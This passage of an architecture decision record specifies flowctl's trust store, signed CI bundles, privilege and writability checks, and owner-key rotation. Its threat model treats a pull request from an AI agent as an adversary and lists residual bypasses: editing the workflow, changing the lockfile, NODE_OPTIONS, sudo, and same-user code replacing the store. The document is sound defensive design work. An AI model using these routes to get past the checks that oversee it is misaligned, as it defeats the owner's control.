  `/tsconfig*.json`, `/packages/*/tsconfig*.json`, `/flowctl.config.yaml`, **the flows directory (`flowsDir`)**,
  `/packages/core/src/run/`, `/packages/core/src/browser/`, `/packages/core/src/system1/`,
  `/packages/core/src/foundation/`, `/packages/core/src/safe-fs.ts`, `/packages/core/src/trust/`,
  `/packages/core/src/config/`, `/packages/core/src/config.ts`, `/packages/core/src/flow/`,
  `/packages/core/src/derive/`, `/packages/core/src/provenance/`, `/packages/core/src/login/`,
  `/packages/core/src/login.ts`, `/packages/core/src/explore/`, `/packages/core/src/save.ts`,
  `/packages/cli/src/index.ts`, `/packages/cli/src/commands/trust*`, `/packages/cli/src/commands/loader*`,
  `/packages/mcp/` (the MCP server package), and the fixture-app contract artefacts of T2.9 (`openapi.yaml`,
  the shared validator, `i18n/vi.json`). Paths that do not exist yet are listed so the rule is in place when
  they appear. **Precondition: branch protection on the protected branches with "require review from code
  owners" enabled**; without it CODEOWNERS is a comment. CODEOWNERS is an additional control and never a trust
  anchor.

## Options considered

- **Per-machine store** (chosen): same pattern as hook consent; works for local and CI; a pull request
  cannot reach it.
- **Values in the repo with CODEOWNERS**: a branch the agent controls carries its own copy. Rejected as the
  anchor; CODEOWNERS stays as an additional control for workflow files.
- **Environment variables or `$XDG_CONFIG_HOME` for the location**: attacker-settable. Rejected.
- **A remote policy service**: adds a service and a network dependency. Not now.

## Consequences

- **Easier:** one place to read for "what may this machine do"; the trust questions in ADRs 0020, 0022 and
  0024 have one answer.
- **Harder:** every machine and CI runner needs a provisioned store; first run needs `flowctl trust init`;
  the store schema is a new public surface (🔴); entries go stale (an origin changes) and the failure mode
  is refusal, which is the intended direction; the owner key and reviewer keys need care.
- **Revisit when:** teams need a shared store (then sign it with a team key), or Windows CI becomes a
  target.

## Amendment 2026-11-01

Accepted by the owner on 2026-11-02, as written and including the recommended default of each decision it marks; tasks T0.18, T0.19, T0.20, T0.21, T0.23, T0.24 and T0.25 are closed.
Closes the store-basics and hook-consent gaps found by the security review of PR #73 and the three independent
reviews that followed it. The status stays `proposed`; owner decisions are marked "Owner decision" in the text.

- **Hook consent in CI** (section 5): the three blanket-consent names are removed in every mode and the `ci`
  marker grants no consent. A hook runs only on a digest already in the store, written with an owner-key
  signature. Why: a pull request could set the flag in the workflow.
- **Digest scope and environment** ([ADR 0021](0021-hook-consent.md), amendment of the same date): the closure
  is an allowlist (builtins, a short utility list, shell scripts that pass the same test), defined once there;
  hooks run from a verified snapshot with an allowlisted environment; the digest is not a sandbox.
- **Store basics** (sections 1, 2 and 3): the location is never read from the environment in any mode; `trust
  init` refuses on an existing store; a `ci` store must be owned by another uid and not writable by the
  current euid (`store_writable_in_ci`); the test suite uses a separate `test` store with a test-only seam;
  project identity is the root commit set only, computed with a scrubbed git environment, and is a copy
  detector; shallow clones are refused; every MCP tool is guarded and the unguarded list is pinned exactly.
- **Signed entries** (section 3): `reviewerKeys`, `handWritten`, `redirect`, `allowReadOnlyReplay`,
  `destructiveConfirm`, `flowFloors`, `roots`, `productionOrigins`, `hooks` and `projects.defaultEnv` need the
  owner-key signature, verified against the pinned public key on every read; a table lists each `trust add`
  kind.
- **Store schema** (section 2): one `allowReadOnlyReplay` schema (grammar in ADR 0024 section 2a); `roots` as a
  purpose-tagged list with root-commit identity for flows roots; `projects.defaultEnv`, `language`, `locale`;
  `reviewerKeys` scope `flows` or `spec`; `flowFloors`, `specFloors`, `latestRevision`, `classification`;
  `handWritten` keyed by closure digest; a production env's `callOrigins` are production origins.
- **Owner confirmation screens** (section 3): built-in paging, escaped invisible and format characters,
  punycode origins, byte lengths, a 256 KiB cap; batch classification shows every flow and cannot class a flow
  with an `uncovered` hook.
- **Harness anchor and CODEOWNERS** (section 6): the anchor is managed settings; user settings count only with
  a self-protecting rule and no `CLAUDE_CONFIG_DIR`; Bash deny rules are friction; the project-settings keys a
  PR can set are listed; the CODEOWNERS list is extended and branch protection with required code-owner review
  is its precondition. PR code earlier in the same CI job is a named residual risk.

## Amendment 2026-11-02

Accepted by the owner on 2026-11-06, as written and including the recommended default of each decision it marks: hosted runners use the `signed` layout with a typed phrase (section 2), a rotation is confirmed on one summary screen with one nonce (section 5), and `trust init` refuses `anchor_unavailable` unless `--anchor-dir` is given (section 7). Closes task T0.29.
The status stays `proposed`. Owner decisions are marked "Owner decision" with the recommended default first.
Where a sentence of the body above conflicts with this amendment, the body sentence carries a note
"superseded" and this amendment wins. "Body section N" means a section of the Decision above; "amendment
section N" means a section of this amendment. Names: **owner machine** holds the owner key; **runner** runs a
CI job; **job user** is the uid that runs `flowctl` in the job.

**Still open, deliberately.** Verifier strictness, anchor `seq` rollback and keychain probing, saved sessions in
CI, a per-kind export allowlist and what a bundle discloses (the full `trust.log`, power-granting entries copied
unfiltered, `--keep-root` paths), expiry and clock-skew edges, old bundles surviving a rotation until their
`expires`, a per-run `bundleSeq` pin (rollback of a signed-layout bundle), the `path_not_canonical` hint for
symlinked homes, and `--ci-pin` for MCP servers are not specified here; they become follow-up tasks of the T0.29
family.

### 1. `trust export --for-ci` and `trust verify-bundle`

`trust export --for-ci <dir> --layout uid|signed --runner-root <source project root>=<runner path>...
[--store-dir <abs path>] [--keep-root <abs path>]... [--expires <days>] [--force-new]` runs on the owner machine,
interactively (nonce on `/dev/tty`, display rules of body section 3), against a non-`ci` store. `--layout` is
required (`layout_invalid` if absent or not `uid`/`signed`). `--store-dir` is required with `uid` and refused
with `signed` (`store_dir_layout_mismatch`). `<dir>` must not exist or must be empty (`bundle_dir_not_empty`).
`--expires` is a whole number of days, 1 to 90, default 30.

**Bundle directory** (created 0755, files 0644; nothing in it is secret):

```
bundle.json  bundle.sig                 manifest and its signature (below)
store/trust.json  store/trust.log       the runner store
store/ledgers/                          empty directory, mode 0700
store/marker                            uid only: {"v":1,"defaultStoreSha256":<sha256 of default/trust.json>}
default/trust.json  default/trust.log   uid only: the default store (below)
```

**`default/`** (uid only) is a complete small store of its own: `trust.json` holds `{ redirect: <abs
--store-dir>, ci: <the ci section>, ownerFingerprint }` and one signed `redirect` entry; `trust.log` has two
lines, `genesis` then `redirect`, each owner-signed (signed bytes in amendment section 5). The hash chain of
`default/trust.log` ends at the head recorded in `default/trust.json`, so it passes the body section 1
checks like any store. `store/marker` names the "default store's fingerprint" of body section 1 as the sha256
of the bytes of `default/trust.json` (`defaultStoreSha256`, a content hash; it is not the owner-key
`ownerFingerprint`).

**Installed layout on the runner.** Provisioning (uid: as root; signed: `verify-bundle --install`) puts into the
**store directory S** exactly: `trust.json`, `trust.log`, `ledgers/` (copied from `store/`), `marker` (uid),
and `bundle.json`, `bundle.sig` (copied from the bundle top level). For uid it also puts into the default
directory **D** (`<passwd home>/.config/flowctl`) exactly: `trust.json`, `trust.log` (from `default/`), `bundle.json`,
`bundle.sig`. For signed, S is D. The `files` keys of the manifest are **relative to the bundle directory**:
`store/trust.json`, `store/trust.log`, and for uid `store/marker`, `default/trust.json`, `default/trust.log`.
On the runner a key `store/<x>` is read as `S/<x>` and `default/<x>` as `D/<x>`. Body section 1's list of
files in the permission checks is read as these installed files.

**Effects on the source store, and commit order.** (1) `bundleSeq` is the source `exportSeq` plus one
(`exportSeq` is an owner-signed scalar in the source `trust.json`, starting at 0). (2) The bundle is written to
a temporary sibling directory and renamed to `<dir>`. (3) Only then does the export append the `export` line to
the source `trust.log`, set `exportSeq` to `bundleSeq` and write the anchor (two-phase, amendment section 7).
A crash before step 3 leaves an unlogged bundle and burns no number; the rerun finds `<dir>` non-empty
(`bundle_dir_not_empty`) and replaces it only with `--force-new`, which deletes `<dir>` first. Nothing else in the
source changes. The scalar singletons `exportSeq`, `ci` and `anchor` are signed like entries (amendment
section 5, `kind` = the field name, `id` = the field name).

**Fields of the exported `trust.json` that differ from the source** (the complete list):
- removed: `anchor`, `exportSeq`, `latestRevision`, `sessionDir`, `redirect`, `test`, and every `roots` entry
  not rewritten (below); sessions are never exported;
- rewritten and re-signed: each `projects[].root` and each flows `roots[].path` (below);
- set and signed: `ci = { layout, bundleId, bundleSeq, ownerFingerprint, expires }`. `ownerFingerprint` is
  lowercase hex sha256 of the 32 raw public-key bytes. Verifiers read it from `trust.json.ci` and from the
  manifest, require the two to be equal, and require both to equal the **externally pinned** value
  (`--owner-fingerprint` for `verify-bundle`, the per-run pin below for every guarded command).
All other entries are copied with their owner signatures, which stay valid (they do not cover the chain head).
An entry whose own `expires` is earlier than the bundle's lowers the bundle's `expires` to the earliest one.

**Runner roots.** `--runner-root <source project root>=<runner path>` maps one source project to one runner
path; repeat it per project, at most 4 runner paths per project, every source project at least once. Paths
must be absolute and canonical (no `.`/`..` component, no glob, no variable, no `~`). For each pair the export
writes a `projects` entry with the same identity and hook entries, and a `flows` root at `<runner path>/<flows
root relative to the source project root>`; a flows root outside its project root ends
`export_root_outside_project`. `roots` of purposes `repos`, `contracts`, `specs`, `issues` are dropped unless
named by `--keep-root <abs path>` (it must equal a source root path; kept unchanged). The vetting of the
`roots` row of body section 2 is re-run, as text, on every written path (credential directory names, an
ancestor of the passwd home of the owner machine or of `--store-dir`); failure ends `runner_root_invalid`. A
job whose checkout realpath is none of the listed paths ends `project_not_trusted`; no variable or symlink
changes that.

**Manifest `bundle.json`:** keys sorted bytewise at every depth, no whitespace, UTF-8, no final newline,
exactly: `v` (1), `bundleId` (UUID v4), `bundleSeq`, `createdAt`, `expires` (UTC ISO-8601), `layout`,
`ownerFingerprint`, `ownerPublicKey` (base64 of the 32 bytes), `files` (path to sha256), `trustLogHead` (hash
of the `export` line of `store/trust.log`), `runnerRoots`. `bundle.sig` is Ed25519 by the owner key over
`"flowctl-bundle-v1\n"` + manifest bytes, base64. The empty `ledgers/` is covered by check 4, not hashed.

**Printed output** (`key=value` lines in this order): `bundleId`, `bundleSeq`, `layout`, `expires`,
`ownerFingerprint`, `trustLogHead`, each `files.<path>`, `runnerRoots`.

**`flowctl trust verify-bundle <dir> --owner-fingerprint <hex> --expect-layout uid|signed [--min-seq <n>]
[--install]`** is unguarded and non-interactive; it writes nothing without `--install`. `<dir>` is the bundle
directory, or on a runner S (then `files` keys are read as the installed layout above). The fingerprint and
layout come from outside the repository (organisation secret or variable, or the image). Checks, first failure
wins:
1. `bundle.json`, `bundle.sig` exist, are regular files opened with `O_NOFOLLOW` and `fstat`ed (no symlink,
   link count 1), and parse: else `bundle_unsigned`.
2. `ownerPublicKey` hashes to `ownerFingerprint`, equal to `--owner-fingerprint`, and equal to
   `trust.json.ci.ownerFingerprint`: else `bundle_fingerprint_mismatch`. `layout` equals `--expect-layout`
   and `trust.json.ci.layout`: else `bundle_layout_mismatch`.
3. The signature verifies: else `bundle_signature_invalid`.
4. Every file in `files` exists with that sha256 (each opened `O_NOFOLLOW`, hashed from the descriptor); the
   directory holds exactly the files named in the layout above and `ledgers/`; `trust.log` is a valid chain
   ending at `trustLogHead`: else `bundle_file_mismatch`. **Emptiness of `ledgers/`** is checked on the bundle
   directory and at `--install` only (else `ledgers_invalid`, detail `not_empty`). On S the per-run repetition
   of this check **skips the contents of `ledgers/`** and checks only that it is a real directory owned by
   `geteuid()` with mode 0700 (else `ledgers_invalid`, detail `not_directory`, `owner` or `mode`).
5. `now < expires`, else `bundle_expired`; `bundleSeq >= --min-seq` when given, else `bundle_seq_below_min`.
6. Every signed entry verifies against `ownerPublicKey`: else `trust_tampered`.

`--install` (signed only; uid ends `bundle_layout_mismatch`) creates S (mode 0700, files 0600) in a temporary
sibling directory by **hashing the bytes while copying them** from the opened source descriptors, compares each
hash to the manifest before it renames the directory into place (`store_exists` if S exists), then repeats
checks 2 to 6 on S. **Every guarded command on a `ci` store repeats checks 2 to 6 on S (and on D for uid)**
and requires the per-run pin: a global option `--ci-pin <fingerprint>:<uid|signed>`; the guarded command ends
`ci_pin_missing` if the store has a `ci` section and the option is absent, and `ci_pin_mismatch` if either
part differs, **or if the store has no `ci` section and the option is given** (so an attacker-made non-`ci`
store is refused). The option only tightens: it selects no store. The exact unguarded list is `--help`,
`--version`, `trust init`, `trust verify-bundle`.

*Tests (one per check):* delete `bundle.sig`: `bundle_unsigned`; pass a different fingerprint:
`bundle_fingerprint_mismatch`; export `signed`, verify with `--expect-layout uid`: `bundle_layout_mismatch`;
flip one byte of `bundle.json`: `bundle_signature_invalid`; edit one byte of `trust.json`, add a stray file,
replace `trust.json` by a symlink: each `bundle_file_mismatch`; put a file in the bundle's `ledgers/`:
`ledgers_invalid`; a first run that writes a ledger, then a second guarded command: passes; set `--expires` and
advance the clock: `bundle_expired`; `--min-seq` above: `bundle_seq_below_min`; change one signed entry and
re-hash the files and manifest with another key: `bundle_fingerprint_mismatch`; run a guarded command without
`--ci-pin`: `ci_pin_missing`; with a non-`ci` store and a pin: `ci_pin_mismatch`.

**Rollback.** A fresh runner remembers no earlier bundle, so an older unexpired valid bundle passes. The bound
is `expires` (at most 90 days) and `--min-seq` from an organisation variable the owner raises at each export.

### 2. Two CI layouts, and what each protects

`ci.layout` is `uid` or `signed`. The `uid` layout is the "owned by another uid" rule of body section 1. A hosted
runner where the job user owns the home and workspace and has passwordless `sudo` **cannot** satisfy it: a
root-owned file proves nothing against `sudo`. The `signed` layout is added for it. **What `signed` drops
compared with `uid`:** the writable-store check (amendment section 3) and a second location for the chain head.
What replaces them is the signature, the external pin on every run, and the ordering rules below.

**`uid` layout** requires all of: S and every ancestor up to `/` owned by another uid and not writable by the
job user (amendment section 3); D (`<passwd home>/.config/flowctl`) exists, is owned by that uid, and so is `<home>`
and every ancestor (a job-created competing default store is then impossible); `ledgers/` is the only
job-writable path. Provisioning checklist, as root, in the image build, in this order: `cp` the bundle files into
S and D as listed in amendment section 1 (parents created root-owned, 0755); `chown -R root:root S D`;
`chmod -R go-w S D`; `chown <job uid> S/ledgers`; **no sudoers entry, no membership of the job uid in the
`docker`, `disk`, `root`, `sudo`, `wheel`, `admin`, `adm`, `lxd`, `libvirt` or `kvm` groups, no setuid or file-capability binary that writes
to a path the caller names**; then `flowctl trust verify-bundle <bundle dir> --owner-fingerprint <hex>
--expect-layout uid`. *Failing example:* a container that runs the job as root (`euid_zero`). *Passing
example:* a self-hosted runner, job uid 1001, store root-owned under `/opt/flowctl/store`.
- **Not protected (uid):** a `sudo` rule or a privileged group the checklist missed; a root-owned setuid helper
  that writes where the caller says; root in the same container; anyone who can mount over S or D; a kernel
  or container escape; **the `flowctl` binary and its dependencies**, if they come from the checked-out tree
  (a pull request that changes the lockfile, a build script or `NODE_OPTIONS` bypasses every check here,
  `--ci-pin` included); code running as the job user can still forge ledger ids (amendment section 4); the
  same-user limits of body section 6 (a consented hook is same-user code).

**`signed` layout** (hosted runner). The first step runs `verify-bundle --install`, before any step that runs
repository or pull-request code. The job user owns the installed store.
- **Protected:** delivery integrity (altered or swapped bundle, another owner, expired bundle, rolled-back
  bundle when `--min-seq` is passed); every signed entry against the owner public key; the owner private key
  never exists on the runner; **a pull request that changes only repository files** cannot add an entry, a hook
  digest or the `ci` section.
- **Not protected:** (1) any code running as the job user, before or during the job, can replace the whole
  directory with its own key, manifest and signature, because the store holds its own copy of the fingerprint;
  per-read checks catch partial or accidental edits only; a consented hook is such code. (2) **The workflow
  itself.** A pull request that edits the workflow can skip `verify-bundle`, pass its own fingerprint, drop
  `--ci-pin`, or point at its own bundle. (3) `sudo` removes every barrier. (4) **The `flowctl` binary and its
  dependencies**, if they come from the checked-out tree: a pull request that changes the lockfile, a build
  script or `NODE_OPTIONS` bypasses every check, `--ci-pin` included.
- **Required owner actions (trust base):** the workflow runs from a trusted ref (for example
  `pull_request_target` using the base branch's workflow, or a required reusable workflow pinned by commit);
  `.github/` is under CODEOWNERS with required review (body section 6 precondition); the fingerprint and
  the layout are passed as `--owner-fingerprint`/`--expect-layout` at install **and** as `--ci-pin` on **every**
  guarded run, from an organisation variable the pull request cannot edit. **Build or obtain `flowctl` from a
  trusted ref in a separate earlier job; run pull-request code (the app under test, tests, installs) only in
  another job or container, and give the flowctl job the bundle and the flow files only, reaching the app by
  URL.** If pull-request code must run in the flowctl job, `signed` protects delivery only. Without these
  actions it protects delivery only as well.

**Owner decision:** how hosted runners may be used. (a) `signed`, recommended: `trust export --layout signed`
prints the protected and not-protected lists above and the owner types a fixed phrase back. (b) `uid` only:
strict, no hosted CI. (c) `signed` plus a workflow-created second uid via `sudo`: rejected, the job user keeps
`sudo`.

### 3. Writability checks beyond mode bits (`uid` layout)

On every read of a `ci` store of layout `uid`, in this order, on S, D, `trust.json`, `trust.log`, `bundle.json`,
`bundle.sig`, `marker` and every ancestor of S and D up to `/`. Paths are resolved with `realpath` and the
result must equal the path as given (no symlink in any component); files are opened `O_NOFOLLOW` and `fstat`ed
on the descriptor. First failure: `store_writable_in_ci` with exactly one `detail`:
0. `path_not_canonical`: the `realpath` differs from the path as given, or a file is a symlink or has link count above 1.
1. `ids_differ`: `getuid() != geteuid()` or `getgid() != getegid()`.
2. `euid_zero`: `geteuid() == 0`.
3. `capability`: Linux only, `CapEff` in `/proc/self/status` has any of bits 0 (`CAP_CHOWN`), 1
   (`CAP_DAC_OVERRIDE`), 3 (`CAP_FOWNER`), 6 (`CAP_SETGID`), 7 (`CAP_SETUID`), 19 (`CAP_SYS_PTRACE`), 21
   (`CAP_SYS_ADMIN`), 31 (`CAP_SETFCAP`); an unreadable file fails closed with this detail.
4. `privileged_group`: `getgroups()` or `getegid()` contains gid 0 or the gid of a group named `docker`,
   `disk`, `root`, `sudo`, `wheel`, `admin`, `adm`, `lxd`, `libvirt` or `kvm` in `/etc/group`.
5. `owner_is_euid`: `st_uid == geteuid()` (also for an ancestor).
6. `mode_bits`: `st_mode & 0o022` is not zero (group membership is not consulted).
7. `access_writable`: `fs.accessSync(path, W_OK)` succeeds, or throws anything other than `EACCES`, `EROFS`
   or `EPERM` (only those three mean "not writable" and pass). This is
   `access(2)`, evaluated by the kernel with ACLs and read-only mounts; Node has no `faccessat(AT_EACCESS)` and
   no ACL API, and flowctl parses no ACL.
Also `fs.accessSync(path, R_OK)` must succeed, else `store_unreadable`.
*Tests (Linux fixture, non-root uid):* store owned by the job uid: `owner_is_euid`; mode 0775: `mode_bits`;
owner root, 0755, `setfacl -m u:<job>:rw`: `access_writable`; run as root: `euid_zero`; run with `CAP_CHOWN`:
`capability`; job user in group `docker`: `privileged_group`; writable parent: the same detail on that ancestor;
a symlinked S: `path_not_canonical`.

### 4. `ledgers/`

`<store>/ledgers` is a fixed name. A non-`ci` store gets it from `trust init` (mode 0700); a `ci` store gets it
from the bundle (empty, check 4) and the provisioner makes the job user its owner. It is the only path of a `ci`
store the job writes, and it holds the run ledgers of [ADR 0024](0024-target-scope-and-guards.md) section 5.
- **Directory:** `lstat` shows a directory (not a symlink), owner `geteuid()`, mode exactly 0700; else
  `ledgers_invalid` with `detail` `not_directory`, `owner`, `mode`; at install a non-empty directory is
  `ledgers_invalid` `not_empty`. Excluded from amendment section 3 checks (its parent is not).
- **Files:** `<run id>.jsonl` (`NAME_PATTERN`), created `O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW`, mode 0600, link
  count 1. **Every read opens `O_RDONLY|O_NOFOLLOW|O_NONBLOCK` and `fstat`s the descriptor before reading**
  (regular file, link count 1, owner `geteuid()`; a FIFO, device or symlink is refused and never blocks), else
  `ledgers_invalid` detail `not_regular`.
- **One error kind.** Every ledger problem is `ledgers_invalid` with exactly one `detail`: `not_directory`,
  `owner`, `mode`, `not_empty`, `not_regular`, `chain`, `foreign`.
- **Header and chain.** Line 0 is `{"v":1,"kind":"ledger-header","runId":<id>,"bundleId":<ci.bundleId or
  null>,"prev":"0000...0"}` (64 zeros). Every later line carries `prev` = lowercase hex sha256 of the previous
  line's UTF-8 bytes without the trailing newline, as ADR 0024 requires; the header is the first chain element.
- **Re-export.** A re-export changes `bundleId`. A ledger whose header `bundleId` differs from the store's, or
  whose header is missing, ends `flowctl cleanup` with `ledgers_invalid` detail `foreign`; the hint says that its ids are
  leftover records and that the owner may delete `S/ledgers/<run id>.jsonl` by hand after cleaning them on the
  environment, then retry. There is no automatic acceptance of an earlier bundle's ledger.
- **Restored ledgers are untrusted input.** A ledger copied back from a workflow artifact may have been written
  by anyone. Cleanup treats it as such: the hash chain, header and run id must verify, and every id still goes
  through the signed `create` entry's `cleanup` template, `ledgerFrom` binding and `QA-` prefix rule. A forged
  id can therefore delete a record that the entry could delete, nothing else.
- **Surviving the job.** The workflow uploads `ledgers/` as an artifact in an always-run step; a later job
  restores it before `flowctl cleanup <run id>`. If the runner vanishes first, ids created since the last
  upload are leftover records (ADR 0024 `QA-` rule).
*Tests:* `ledgers` as a symlink, mode 0755, or foreign owner: `ledgers_invalid` (`not_directory`, `mode`,
`owner`); a ledger file that is a symlink or a FIFO: `not_regular`, without blocking; a ledger with the wrong
`bundleId`: `foreign`; a ledger with a changed byte in line 3: `chain`; a non-empty `ledgers/` at install:
`not_empty`; a ledger written by run 1 does not fail the checks of run 2.

### 5. Owner key: custody, signed bytes, rotation

- **Key file** `<owner-key-dir>/owner.key`: directory 0700, file 0400, `O_EXCL|O_NOFOLLOW`, outside any
  repository. JSON `{"v":1,"kdf":"scrypt","N":131072,"r":8,"p":1,"salt":<16 bytes b64>,"nonce":<12 bytes
  b64>,"ct":<AES-256-GCM of the 32-byte seed, b64>}`, AES key = 32 bytes of scrypt output, associated data
  `flowctl-owner-key-v1`. Derivation calls scrypt with `maxmem` 268435456. **Decrypt-time floors:** a file with
  `N < 131072`, `r < 8`, `p < 1`, or `N > 1048576` is refused with `key_params_weak` before any derivation.
  The passphrase comes from `/dev/tty` only (never argv, environment, file) and must have **at least 16 Unicode
  code points after NFKC normalisation**. No unencrypted key, and no hardware-backed owner key, exists here.
- **Custody.** The owner machine only; never exported, never on a runner (which holds the public key).
  `trust key new|add` refuses a path equal to or under the owner-key directory. Backup: the owner copies the
  encrypted file; loss of file or passphrase has one recovery, amendment section 6 without the old key.
- **Signed bytes.** Canonical JSON means keys sorted bytewise at every depth, no whitespace, UTF-8.
  - A `trust.json` **entry**: Ed25519 over `"flowctl-entry-v1\n"` + canonical `{"id":<entry id>,"kind":<section
    name>,"value":<the entry's value>}`; stored beside the entry as `sig`. It does not cover the chain head.
    A scalar singleton of `trust.json` (`exportSeq`, `ci`, `anchor`, `ownerFingerprint`) is signed the same
    way with `kind` and `id` both equal to the field name.
  - A `trust.log` line is canonical JSON `{"seq","prev","kind","body",...}`; its hash is sha256 of its bytes
    without the newline. Lines of kind `genesis`, `redirect`, `export`, `rotate`, `replaced` carry owner
    signatures in `sig` (`rotate`: `sigOld` and `sigNew`) over `"flowctl-<kind>-v1\n"` + the canonical line
    without the signature fields. The chain hash includes the signature fields.
  - A log line is verified with the owner key current at that line; the verifier follows `rotate` lines, so
    **lines written before a rotation still verify after it**.
- **`flowctl trust key rotate-owner`** (needed before T4.5). Interactive, nonce on `/dev/tty`, asks the old and a
  new passphrase. All new state is staged; **the rename of `trust.json` is the only commit point**:
  1. verify the whole store with the old key, else `rotate_unverified`, nothing changes;
  2. write `owner.key.new`, `trust.log.new` (the old log plus a `rotate` line signed by both keys) and
     `trust.json.new` (every entry re-signed, `ownerFingerprint` set, head = the new log's head);
  3. two-phase anchor write (amendment section 7) with the new head pending;
  4. rename `trust.json.new` over `trust.json` (**commit**);
  5. rename `trust.log.new` over `trust.log`; rename `owner.key` to `owner.key.retired-<UTC date>.<n>` (`n` the
     smallest integer from 1 for which the name does not exist, so no earlier file is overwritten), then
     `owner.key.new` to `owner.key`; finish the anchor.
  **Crash recovery.** Any command that finds a `*.new` file ends `rotate_incomplete` (hint: rerun `trust key
  rotate-owner`). The rerun reads two facts, `trust.json.ownerFingerprint` (F) and whether the last `rotate`
  line of `trust.log` names it (L), and acts:

  | F is | L | `*.new` present | Action |
  |---|---|---|---|
  | old | no | any | delete every `*.new` and the pending anchor; start over |
  | new | no | `trust.log.new` | do step 5 from the log rename |
  | new | yes | `owner.key.new` | rename the keys (step 5 end), finish the anchor |
  | new | yes | none | nothing to do |
  | new | no | no `trust.log.new` | `trust_tampered` |

  *Implementation note (T1.0, flagged for the owner):* after an earlier rotation, the old fingerprint is also the
  `to` of the last `rotate` line, so L alone cannot tell old from new. The implementation decides by state instead:
  when `trust.json` still matches `trust.log` the rotation is uncommitted and is rolled back, unless the anchor
  holds the store's head as pending and the log ends with a `rotate` line to F and its `write` line (then the keys
  and the anchor are finished); when it does not match, a lone `trust.log.new` that matches it is renamed into place
  and the rotation finished; anything else is `trust_tampered` (detail `rotate_state`). A lone `owner.key.new` blocks
  only commands that unlock the owner key (`loadOwnerKey` refuses with `rotate_incomplete`); read-only commands
  still run. A rotation first commits any anchor head left pending at the store's head, so a pending anchor never
  outlives its rotation and a later rotation's leftover key cannot be mistaken for it. The rerun recovers on
  `/dev/tty` before it shows the nonce, since recovery only ends a change the owner already confirmed.

  After step 5 the old key verifies no entry (`trust_tampered`). Bundles exported earlier name the old
  fingerprint and fail `bundle_fingerprint_mismatch`; the owner re-exports.
- **Compromise.** Rotation does not help when the old key is stolen; use amendment section 6.
- **Owner decision:** confirmation during rotation. Recommended: one screen with the count of entries per kind
  and the sha256 of the whole store, one nonce (no entry content changes). Alternative: one nonce per entry.
*Tests:* a key file with `N=1024`: `key_params_weak`; a 15-code-point passphrase: refused; kill the process after
step 4 and rerun: completes and verifies; kill before step 4 and rerun: old state restored; two rotations on one
day keep both `owner.key.retired-*` files; after rotation an old `export` log line still verifies and an entry
signed only by the old key is `trust_tampered`.

### 6. `trust init --replace`

Creates a **new** store and carries nothing over (no entry, hook digest, reviewer key or floor). Each signature
input exists when it is signed:
1. Interactive, nonce on `/dev/tty`. Verify the old store in full, else `replace_unverified` (the owner removes
   it by hand).
2. Create the new owner key (`owner.key.new` in the owner-key directory) and prepare the **complete** new store
   in `<store>.new` by the `trust init` rules (body section 3, "First use"; `--anchor-dir` and
   `anchor_unavailable` apply to the new store exactly as to `init`). Its first log line `genesis` carries the
   old fingerprint and the old chain head, signed by the **new** key. **The new anchor record is written now,
   before the swap**; the new fingerprint and store id exist from here on.
3. With the old passphrase, append a `replaced` line to the **old** `trust.log`, signed by the old key over the
   new fingerprint and the new store id.
4. **Swap:** rename `<store>` to `<store>.replaced-<UTC date>.<n>` (`n` as in amendment section 5), `<store>.new`
   to `<store>`, then the owner-key files as in rotation step 5. Then delete the old anchor record.
**Crash outcomes.** Before step 3: the old store is intact; a rerun deletes `<store>.new`, `owner.key.new` and
the new anchor and starts over. After step 3, before the swap completes: the old store's last line is
`replaced`, and `<store>` missing with a `<store>.replaced-*` present is the same state; both end
`store_replaced` (hint: finish the renames of step 4 by hand, the staged `<store>.new` is the new store). After
step 4 the new store works; a leftover old anchor record names the old store id and is ignored.
Exported bundles of the old store fail `bundle_fingerprint_mismatch`.
Without the old key the command cannot run; the owner removes the store by hand and runs `trust init`.
*Tests:* a corrupted `trust.log`: `replace_unverified`; after success an old entry gives `trust_missing`;
the old log's last line is `replaced` and verifies with the old key; a kill after step 3 leaves `store_replaced`.

*Implementation note (T1.0, flagged for the owner):* step 4 moves the owner-key files **before** the two directory
renames. Once the old log ends with `replaced` the old store refuses with `store_replaced` whatever key is in place,
and this order never leaves `owner.key.new` next to the new store, where `trust key rotate-owner` recovery would read
it as its own. The `store_replaced` message lists the key renames and the directory renames that finish step 4. The
store lock is released after step 3, so the lock file does not move with the old store. Step 3 also moves the old
anchor to the `replaced` line (two-phase, as every write), so cutting that line off the old log gives
`anchor_head_mismatch` and never revives the old store, even while the old anchor record still exists. A rerun that
removes `<store>.new` deletes its anchor record only when that store verifies, has another store id than the old
store and (for a file) another real path; it renames `owner.key.new` to `owner.key.abandoned-<UTC date>.<n>` instead
of deleting it, and it runs under the store lock. A failure in step 2 (for example `anchor_unavailable`) cleans up the
same way. While `<store>.new` exists, `trust key rotate-owner` refuses `rotate_incomplete` and points to `trust init
--replace`. Any read refusal of the old store (`trust_tampered`) is reported as `replace_unverified` with the same
detail; for `anchor_unreachable` the hint is to unlock the keychain and retry.

### 7. The anchor (second head) and hosts without a keychain

- **Record:** `{"v":1,"storeId":<uuid>,"ownerFingerprint":<hex>,"head":<hash>,"seq":<n>,"pending":null|
  {"head","seq"}}`, in the first location that works at `trust init`, recorded in `trust.json` as `anchor:
  { kind, locator }` (owner-signed): (1) macOS keychain, generic password, service `flowctl-trust`, account
  `<storeId>`, via `/usr/bin/security add-generic-password -U`; (2) Linux Secret Service, attributes
  `service=flowctl-trust account=<storeId>`, via `secret-tool` when a session bus answers; (3) a file
  `<anchor dir>/<storeId>.anchor`, mode 0600, in `--anchor-dir`, an absolute directory outside the store and any
  repository.
- **Every store write is two-phase.** Phase 1 first reconciles, with `Hs` the head of the store on disk: if the
  anchor has a `pending` and `Hs == pending.head`, set `head = Hs`, `pending = null`; if `Hs == head`, leave it;
  any other `Hs` is `trust_tampered` (`anchor_head_mismatch`) and nothing is written. It then writes `pending`
  = the new head. Then the new `trust.json` is renamed into place. Phase 2 writes `head` = new head and
  `pending` null. A read accepts `Hs` equal to `head` or `pending.head`; else `anchor_head_mismatch`. So two
  writes in a row, with a crash after either rename, never leave a head the next write cannot reconcile.
- **Enforced:** the recorded kind decides where to look; an unreachable anchor is `trust_tampered` with `detail
  anchor_unreachable`; there is no downgrade.
- **No keychain** and no `--anchor-dir`: `trust init` ends `anchor_unavailable`. **Owner decision:** (a) refuse
  unless `--anchor-dir` is given, recommended; (b) a file next to the store: rejected, one edit moves both;
  (c) no second head: rejected. A file anchor elsewhere detects an edit of only one copy; an adversary of the same
  uid who edits both is the limit of body section 6.
- **`ci` stores** have no anchor and need no keychain: the second head is `trustLogHead` in the signed
  manifest, and the store changes only by a new export.
